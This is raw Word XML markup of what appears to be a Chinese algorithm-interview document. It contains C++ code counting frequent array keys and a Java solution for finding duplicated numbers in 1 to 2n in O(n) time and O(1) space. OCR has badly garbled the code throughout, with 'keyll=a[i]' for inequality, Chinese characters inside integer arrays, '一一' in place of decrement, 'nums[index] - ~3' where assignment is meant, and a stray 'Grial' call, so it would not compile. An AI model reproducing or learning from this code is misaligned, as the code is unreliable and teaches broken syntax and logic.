          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (!count2 &amp;&amp;key3 != a[i] &amp;&amp; keyll=a[i])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>count2++;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>key2 = a[i];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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00" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>else if (key2 == a[i])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>count</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>2++;</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 xml:space="preserve">else if (keylJ=a[i] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">&amp;&amp; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>key3.=a[i])</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count2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>一一</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="600" w:line="315"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15" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (Jcounts &amp;&amp; keyl!=a[i] &amp;&amp; key2J=a[i])</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680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>count3++;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>key3 = a[i];</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else if (key3 == a[i])</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count3++;</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else if (keylJ=a[i] &amp;&amp; key2.=a[i])</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count3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>一一</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="720" w:line="315"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cout « keyl « endl;</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cout « key2 « endl;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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cout « key3 « endl;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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 xml:space="preserve">int a[] = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>{爲5,5,5,5,2,3,爲2,2,，爲爲</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="460" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="820" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Grial(a, sizeof(a) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">/ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>sizeof(int：); return 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="425"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="630" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="bookmark17"/>
      <w:bookmarkEnd w:id="15"/>
      <w:bookmarkStart w:id="16" w:name="bookmark15"/>
      <w:bookmarkStart w:id="17" w:name="bookmark16"/>
      <w:bookmarkStart w:id="18" w:name="bookmark18"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>l-2n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>的数存储在空间为</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sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>的数组中，找岀出现两次的数 字，时间复杂度</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>O (n)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>，空间复杂度</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">O </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(1)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
      <w:bookmarkEnd w:id="17"/>
      <w:bookmarkEnd w:id="18"/>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奇数零次偶数零次。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>奇数一次 偶数零次</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-1</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奇数两次偶数零次</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-2</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奇数零次 偶数一次-3</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奇数一次 偶数一次-4</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奇数两次偶数一次-5</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奇数零次偶数两次％</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奇数一次偶数两次-7</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>奇数两次偶数两次-8</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lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>public class Main {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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public static void main(String[. args) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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int[] nums = {1, 3, 5, 15,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">七 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>8, 5, 3, 6, 15};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="600" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>f indNumber (nums, nums. length); print(nums);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:hanging="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>public static void findNumber(int[] nums, int length) { for (int i = 0; i &lt; length; ) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (nums[i] &lt;= 0){</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2100" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>continue;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">int index = nums[i] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">/ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">2. boolean isOdd = (nums[i： </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">% </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">2 == 0) ? false </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>true; switch (nums[index]) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2100" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>case 0：</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if (isOdd == true) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2920" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">nums[index]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 else {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2920" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">nums[index] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>~3;</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left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>case ~1:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2920" w:right="0" w:hanging="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">if (isOdd == true) { nums[index] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>~2;</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 else {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2920" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">nums[index] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>~4;</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left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>case ~2:</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 xml:space="preserve">nums[index] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-3;</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left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>case -3：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2500" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (isOdd == true) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
